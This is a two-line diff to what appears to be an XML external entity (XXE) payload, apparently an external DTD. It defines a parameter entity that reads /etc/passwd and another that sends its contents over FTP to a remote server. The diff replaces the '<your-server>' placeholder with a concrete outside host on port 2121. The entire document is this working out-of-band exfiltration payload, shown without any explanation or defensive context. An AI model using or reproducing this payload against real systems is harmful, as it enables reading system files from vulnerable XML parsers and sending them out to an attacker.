@@ -1,2 +1,2 @@
 <!ENTITY % d SYSTEM "file:///etc/passwd">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://<your-server>:2121/%d;'>"> 
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://coolhacks.co:2121/%d;'>"> 
